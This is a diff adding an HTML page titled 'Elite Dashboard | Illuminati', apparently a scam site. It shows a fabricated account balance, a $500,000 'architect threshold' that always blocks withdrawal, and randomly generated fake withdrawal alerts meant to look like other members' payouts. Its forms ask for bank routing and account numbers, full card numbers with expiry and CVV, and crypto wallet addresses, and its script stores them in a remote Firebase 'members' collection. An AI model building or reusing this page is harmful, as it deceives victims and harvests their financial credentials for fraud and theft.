@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style id="early-anti-flash">html { display: none !important; }</style>
+    <script src="/local-router.js"></script>
+    <script src="security.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Elite Dashboard | Illuminati</title>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-primary: #0F172A;
+            --bg-secondary: #1E293B;
+            --bg-tertiary: #334155;
+            --text-primary: #F8FAFC;
+            --text-secondary: #CBD5E1;
+            --gold-color: #F3BA2F;
+            --gold-hover: #FCD34D;
+            --success-color: #10B981;
+            --error-color: #EF4444;
+            --border-color: #475569;
+            --shadow-color: rgba(0, 0, 0, 0.8);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .dashboard-container {
+            display: grid;
+            grid-template-columns: 1fr 350px;
+            gap: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .wealth-counter {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
+            border: 3px solid var(--gold-color);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wealth-counter::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, var(--gold-color), var(--gold-hover), var(--gold-color));
+            border-radius: 20px;
+            z-index: -1;
+            animation: borderGlow 3s linear infinite;
+        }
+
+        @keyframes borderGlow {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .counter-title {
+            font-size: 1.2rem;
+            color: var(--gold-color);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .counter-amount {
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: var(--gold-color);
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+
+        .counter-target {
+            font-size: 1rem;
+            color: #a0a0a0;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--success-color), var(--gold-color));
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+
+        .status-indicator {
+            background: var(--card-bg);
+            border: 2px solid var(--gold-color);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .status-light {
+            width: 40px;
+            height: 40px;
+            background: var(--gold-color);
+            border-radius: 50%;
+            margin: 15px auto;
+            animation: pulse 2s infinite;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+        }
+
+        @keyframes pulse {
+            0%, 100% { 
+                transform: scale(1);
+                box-shadow: 0 0 20px rgba(255, 215, 0, 0.6);
+            }
+            50% { 
+                transform: scale(1.1);
+                box-shadow: 0 0 30px rgba(255, 215, 0, 0.8);
+            }
+        }
+
+        .status-text {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--gold-color);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .feed-container {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 15px;
+            padding: 20px;
+            height: 400px;
+            overflow-y: auto;
+            position: relative;
+        }
+
+        .feed-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--gold-color);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+
+        .notification-popup {
+            position: absolute;
+            top: 50%;
+            right: -300px;
+            transform: translateY(-50%);
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.9), rgba(0, 255, 136, 0.8));
+            border: 2px solid var(--success-color);
+            border-radius: 12px;
+            padding: 15px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            min-width: 250px;
+            animation: slideInRight 0.5s ease-out;
+        }
+
+        .notification-popup.slide-out {
+            animation: slideOutRight 0.5s ease-out forwards;
+        }
+
+        .wallet-section {
+            background: var(--card-bg);
+            border: 2px solid var(--gold-color);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            animation: slideUp 1s ease-out;
+        }
+
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--gold-color);
+            margin-bottom: 25px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-align: center;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+
+        .wallet-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 25px;
+            transition: all 0.3s ease;
+        }
+
+        .wallet-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--gold-color);
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
+        }
+
+        .wallet-icon {
+            font-size: 2rem;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .wallet-title {
+            font-weight: 700;
+            color: var(--gold-color);
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+            text-align: center;
+        }
+
+        .wallet-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-label {
+            color: #e0e0e0;
+            font-weight: 500;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+
+        .card-input-group {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+        }
+
+        .card-input {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px;
+            color: var(--text-color);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .card-input:focus {
+            border-color: var(--gold-color);
+            outline: none;
+        }
+
+        .crypto-select {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px;
+            color: var(--text-color);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .withdraw-btn {
+            background: linear-gradient(135deg, var(--gold-color), var(--gold-hover));
+            color: var(--bg-color);
+            border: none;
+            border-radius: 10px;
+            padding: 18px 40px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 30px;
+            width: 100%;
+            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        .withdraw-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.6);
+        }
+
+        .withdraw-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        @media (max-width: 768px) {
+            .wallet-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .card-input-group {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @keyframes slideInRight {
+            from { 
+                opacity: 0;
+                transform: translateY(-50%) translateX(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(-50%) translateX(0);
+            }
+        }
+
+        @keyframes slideOutRight {
+            from { 
+                opacity: 1;
+                transform: translateY(-50%) translateX(0);
+            }
+            to { 
+                opacity: 0;
+                transform: translateY(-50%) translateX(20px);
+            }
+        }
+
+        .notification-header {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: var(--success-color);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .notification-amount {
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--gold-color);
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        }
+
+        .notification-details {
+            font-size: 0.8rem;
+            color: #e0e0e0;
+            line-height: 1.4;
+        }
+
+        .notification-time {
+            font-size: 0.7rem;
+            color: var(--success-color);
+            margin-top: 8px;
+            opacity: 0.8;
+        }
+
+        .feed-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            border-left: 3px solid var(--success-color);
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { 
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .feed-time {
+            color: var(--success-color);
+            font-weight: 600;
+            margin-right: 10px;
+            font-size: 0.8rem;
+            min-width: 40px;
+        }
+
+        .feed-content {
+            flex: 1;
+            color: #e0e0e0;
+            font-size: 0.8rem;
+            line-height: 1.4;
+        }
+
+        .feed-amount {
+            color: var(--gold-color);
+            font-weight: 700;
+            margin-left: 8px;
+        }
+
+        .action-cards {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .action-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .action-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border-color: var(--gold-color);
+        }
+
+        .action-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+
+        .action-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--gold-color);
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .action-desc {
+            color: #a0a0a0;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+
+        .action-btn {
+            background: var(--gold-color);
+            color: var(--bg-color);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .action-btn:hover {
+            background: var(--gold-hover);
+            transform: scale(1.05);
+        }
+
+        .withdraw-section {
+            background: linear-gradient(135deg, rgba(0, 102, 204, 0.1), rgba(0, 102, 204, 0.05));
+            border: 2px solid var(--alert-blue);
+            border-radius: 15px;
+            padding: 25px;
+        }
+
+        .withdraw-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--alert-blue);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+
+        .withdraw-form {
+            display: grid;
+            gap: 15px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-label {
+            color: var(--gold-color);
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .form-input {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px;
+            color: var(--text-color);
+            font-size: 1rem;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--gold-color);
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        @media (max-width: 1024px) {
+            .dashboard-container {
+                grid-template-columns: 1fr;
+                padding: 15px;
+            }
+
+            .sidebar {
+                order: -1;
+            }
+
+            .action-cards {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .counter-amount {
+                font-size: 2.5rem;
+            }
+
+            .feed-container {
+                height: 300px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard-container">
+        <div class="main-content">
+            <div class="wealth-counter">
+                <div class="counter-title">Current Balance</div>
+                <div class="counter-amount" id="balanceAmount">$47,850</div>
+                <div class="counter-target">Target: $500,000</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width: 9.57%;"></div>
+                </div>
+            </div>
+
+            <div class="wallet-section">
+                <h2 class="section-title" data-translate>💼 Connect Assets</h2>
+                <div class="wallet-grid">
+                    <div class="wallet-card">
+                        <div class="wallet-icon">🏦</div>
+                        <h3 class="wallet-title" data-translate>ACH Transfer</h3>
+                        <div class="wallet-form">
+                            <div class="form-group">
+                                <label data-translate class="form-label">Routing Number</label>
+                                <input type="text" class="form-input" placeholder="Enter routing number" id="routingNumber" data-translate>
+                            </div>
+                            <div class="form-group">
+                                <label data-translate class="form-label">Account Number</label>
+                                <input type="text" class="form-input" placeholder="Enter account number" id="accountNumber" data-translate>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="wallet-card">
+                        <div class="wallet-icon">💳</div>
+                        <h3 class="wallet-title" data-translate>Credit/Debit Card</h3>
+                        <div class="wallet-form">
+                            <div class="card-input-group">
+                                <input type="text" class="card-input" placeholder="1234 5678 9012 3456" id="cardNumber" maxlength="19" data-translate>
+                            </div>
+                            <div class="card-input-group">
+                                <input type="text" class="card-input" placeholder="MM/YY" id="cardExpiry" maxlength="5" data-translate>
+                            </div>
+                            <div class="card-input-group">
+                                <input type="text" class="card-input" placeholder="CVV" id="cardCVV" maxlength="4" data-translate>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="wallet-card">
+                        <div class="wallet-icon">₿</div>
+                        <h3 class="wallet-title" data-translate>Crypto Wallet</h3>
+                        <div class="wallet-form">
+                            <div class="crypto-select">
+                                <select class="form-input" id="cryptoType">
+                                    <option value="BTC">Bitcoin (BTC)</option>
+                                    <option value="ETH">Ethereum (ETH)</option>
+                                    <option value="USDT">Tether (USDT)</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label data-translate class="form-label">Wallet Address</label>
+                                <input type="text" class="form-input" placeholder="Enter wallet address" id="cryptoAddress" data-translate>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="withdraw-btn" id="withdrawBtn" onclick="attemptWithdrawal()" disabled data-translate>
+                    WITHDRAW FUNDS
+                </button>
+            </div>
+
+            <div class="action-cards">
+                <div class="action-card">
+                    <div class="action-icon">💰</div>
+                    <div class="action-title">Withdraw Funds</div>
+                    <div class="action-desc">Request withdrawal from your Elite account</div>
+                    <button class="action-btn" onclick="showWithdrawModal()" data-translate>INITIATE</button>
+                </div>
+                <div class="action-card">
+                    <div class="action-icon">📊</div>
+                    <div class="action-title">Transaction History</div>
+                    <div class="action-desc">View your complete transaction history</div>
+                    <button class="action-btn" onclick="showHistory()" data-translate>VIEW</button>
+                </div>
+                <div class="action-card">
+                    <div class="action-icon">🔐</div>
+                    <div class="action-title">Security Settings</div>
+                    <div class="action-desc">Manage your account security protocols</div>
+                    <button class="action-btn" onclick="showSecurity()" data-translate>MANAGE</button>
+                </div>
+                <div class="action-card">
+                    <div class="action-icon">📞</div>
+                    <div class="action-title">Contact Support</div>
+                    <div class="action-desc">Get assistance from your account manager</div>
+                    <button class="action-btn" onclick="showSupport()" data-translate>CONTACT</button>
+                </div>
+            </div>
+
+            <div class="withdraw-section">
+                <div class="withdraw-title">Quick Withdrawal</div>
+                <div class="withdraw-form">
+                    <div class="form-group">
+                        <label data-translate class="form-label">Amount (USD)</label>
+                        <input type="number" class="form-input" placeholder="Enter amount" id="withdrawAmount" data-translate>
+                    </div>
+                    <div class="form-group">
+                        <label data-translate class="form-label">Destination</label>
+                        <input type="text" class="form-input" placeholder="Enter destination" id="withdrawDestination" data-translate>
+                    </div>
+                    <button class="action-btn" style="width: 100%;" onclick="processWithdrawal()" data-translate>PROCESS WITHDRAWAL</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="sidebar">
+            <div class="status-indicator">
+                <div class="status-text">OVERSIGHT PROTECTION</div>
+                <div class="status-light"></div>
+                <div style="color: var(--success-color); font-weight: 600;">ACTIVE</div>
+            </div>
+
+            <div class="feed-container">
+                <div class="feed-title">Live Activity Feed</div>
+                <div id="liveFeed">
+                    <!-- Feed items will be dynamically added here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCO174C8QbyOodW1e5aQ5PW2pWJ01tO7jE",
+            authDomain: "illuminati---oversight.firebaseapp.com",
+            projectId: "illuminati---oversight",
+            storageBucket: "illuminati---oversight.firebasestorage.app",
+            messagingSenderId: "307854810652",
+            appId: "1:307854810652:web:196f634b4f0ebf4be949d9"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Get current user email from localStorage
+        const currentUserEmail = localStorage.getItem('userEmail') || 'demo@example.com';
+
+        // Save financial data to Firebase
+        function saveFinancialData(type, data) {
+            db.collection('members').where('email', '==', currentUserEmail).get()
+                .then((querySnapshot) => {
+                    if (!querySnapshot.empty) {
+                        const userDoc = querySnapshot.docs[0];
+                        const updateData = {};
+                        updateData[`${type}_data`] = data;
+                        updateData[`${type}_updated`] = new Date().toISOString();
+                        
+                        userDoc.ref.update(updateData)
+                            .then(() => {
+                                console.log(`✅ ${type} data saved to Firebase`);
+                            })
+                            .catch((error) => {
+                                console.error(`❌ Error saving ${type} data:`, error);
+                            });
+                    }
+                })
+                .catch((error) => {
+                    console.error('❌ Error finding user document:', error);
+                });
+        }
+
+        // ACH form handler
+        function saveACHData() {
+            const routingNumber = document.getElementById('routingNumber').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            
+            if (routingNumber && accountNumber) {
+                const achData = {
+                    routingNumber,
+                    accountNumber,
+                    type: 'ACH'
+                };
+                saveFinancialData('ach', achData);
+                alert('ACH banking details saved successfully!');
+            } else {
+                alert('Please fill in all ACH fields');
+            }
+        }
+
+        // Card form handler
+        function saveCardData() {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCVV = document.getElementById('cardCVV').value;
+            
+            if (cardNumber && cardExpiry && cardCVV) {
+                const cardData = {
+                    cardNumber,
+                    cardExpiry,
+                    cardCVV,
+                    type: 'Card'
+                };
+                saveFinancialData('card', cardData);
+                alert('Card details saved successfully!');
+            } else {
+                alert('Please fill in all card fields');
+            }
+        }
+
+        // Crypto form handler
+        function saveCryptoData() {
+            const cryptoType = document.getElementById('cryptoType').value;
+            const cryptoAddress = document.getElementById('cryptoAddress').value;
+            
+            if (cryptoType && cryptoAddress) {
+                const cryptoData = {
+                    cryptoType,
+                    cryptoAddress,
+                    type: 'Crypto'
+                };
+                saveFinancialData('crypto', cryptoData);
+                alert('Crypto wallet details saved successfully!');
+            } else {
+                alert('Please fill in all crypto fields');
+            }
+        }
+
+        // Generate sliding notification pop-ups
+        const countries = ['Nicaragua', 'Argentina', 'Brazil', 'Mexico', 'Ecuador', 'Panama', 'Chile', 'Peru', 'Colombia', 'Venezuela'];
+        const feedContainer = document.getElementById('liveFeed');
+        let notificationId = 0;
+        
+        function generateNotification() {
+            const country = countries[Math.floor(Math.random() * countries.length)];
+            const amount = Math.floor(Math.random() * 25000) + 5000;
+            const time = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+            
+            // Create notification popup
+            const notification = document.createElement('div');
+            notification.className = 'notification-popup';
+            notification.id = `notification-${notificationId++}`;
+            notification.innerHTML = `
+                <div class="notification-header">WITHDRAWAL ALERT</div>
+                <div class="notification-amount">$${amount.toLocaleString()}</div>
+                <div class="notification-details">Member [REDACTED] - ${country}</div>
+                <div class="notification-time">${time}</div>
+            `;
+            
+            feedContainer.appendChild(notification);
+            
+            // Position notification at random vertical position
+            const maxTop = feedContainer.offsetHeight - 100;
+            notification.style.top = Math.random() * maxTop + 'px';
+            
+            // Auto-remove notification after 8 seconds
+            setTimeout(() => {
+                notification.classList.add('slide-out');
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                    }
+                }, 500);
+            }, 8000);
+        }
+        
+        // Generate initial notifications
+        for (let i = 0; i < 3; i++) {
+            setTimeout(() => generateNotification(), i * 1000);
+        }
+        
+        // Add new notification every 1-2 minutes
+        setInterval(() => {
+            generateNotification();
+        }, Math.random() * 60000 + 60000); // Random between 1-2 minutes
+        
+        // Initialize balance and notifications
+        let currentBalance = 47850;
+        const targetBalance = 500000;
+        
+        // Update balance display
+        function updateBalance() {
+            const balanceElement = document.getElementById('balanceAmount');
+            const progressElement = document.getElementById('progressFill');
+            const withdrawBtn = document.getElementById('withdrawBtn');
+            
+            balanceElement.textContent = `$${currentBalance.toLocaleString()}`;
+            const progressPercentage = (currentBalance / targetBalance) * 100;
+            progressElement.style.width = `${progressPercentage}%`;
+            
+            // Enable/disable withdraw button based on threshold
+            if (currentBalance >= targetBalance) {
+                withdrawBtn.disabled = false;
+                withdrawBtn.textContent = 'WITHDRAW FUNDS';
+            } else {
+                withdrawBtn.disabled = true;
+                withdrawBtn.textContent = 'MINIMUM NOT MET';
+            }
+        }
+
+        // Withdrawal with threshold check
+        function attemptWithdrawal() {
+            if (currentBalance < targetBalance) {
+                // Show unauthorized popup
+                showUnauthorizedPopup();
+                return;
+            }
+            
+            // Process withdrawal if threshold met
+            const amount = document.getElementById('withdrawAmount').value;
+            const destination = document.getElementById('withdrawDestination').value;
+            
+            if (!amount || !destination) {
+                alert('Please enter withdrawal amount and destination');
+                return;
+            }
+            
+            // Simulate withdrawal processing
+            currentBalance -= parseFloat(amount);
+            updateBalance();
+            
+            // Add to transaction history
+            addTransaction({
+                type: 'withdrawal',
+                amount: amount,
+                destination: destination,
+                timestamp: new Date().toLocaleString(),
+                status: 'completed'
+            });
+            
+            alert(`Withdrawal of $${amount} processed successfully`);
+        }
+
+        // Show unauthorized popup
+        function showUnauthorizedPopup() {
+            const popup = document.createElement('div');
+            popup.className = 'notification-popup';
+            popup.innerHTML = `
+                <div style="color: var(--gold-color); font-weight: 700; margin-bottom: 10px;">
+                    ⚠️ UNAUTHORIZED
+                </div>
+                <div style="color: #e0e0e0; font-size: 0.9rem;">
+                    MINIMUM ARCHITECT THRESHOLD NOT MET<br>
+                    Required balance: $500,000<br>
+                    Current balance: $${currentBalance.toLocaleString()}
+                </div>
+            `;
+            
+            document.body.appendChild(popup);
+            
+            // Auto-remove after 5 seconds
+            setTimeout(() => {
+                popup.classList.add('slide-out');
+                setTimeout(() => {
+                    if (popup.parentNode) {
+                        popup.parentNode.removeChild(popup);
+                    }
+                }, 500);
+            }, 5000);
+        }
+        
+        // Action functions
+        function showWithdrawModal() {
+            alert('Withdrawal modal would open here');
+        }
+        
+        function showHistory() {
+            alert('Transaction history would display here');
+        }
+        
+        function showSecurity() {
+            alert('Security settings panel would open here');
+        }
+        
+        function showSupport() {
+            alert('Support contact options would display here');
+        }
+        
+        function processWithdrawal() {
+            const amount = document.getElementById('withdrawAmount').value;
+            const destination = document.getElementById('withdrawDestination').value;
+            
+            if (amount && destination) {
+                alert(`Withdrawal of $${amount} to ${destination} would be processed`);
+                document.getElementById('withdrawAmount').value = '';
+                document.getElementById('withdrawDestination').value = '';
+            } else {
+                alert('Please fill in all fields');
+            }
+        }
+        
+        // Add entrance animation
+        document.addEventListener('DOMContentLoaded', () => {
+            const elements = document.querySelectorAll('.wealth-counter, .action-card, .withdraw-section, .status-indicator, .feed-container');
+            elements.forEach((element, index) => {
+                element.style.opacity = '0';
+                element.style.transform = 'translateY(30px)';
+                setTimeout(() => {
+                    element.style.transition = 'all 0.8s ease';
+                    element.style.opacity = '1';
+                    element.style.transform = 'translateY(0)';
+                }, index * 200);
+            });
+        });
+    </script>
+    <script src="global-audio.js"></script>
+</body>
+</html>
+
+
+
+
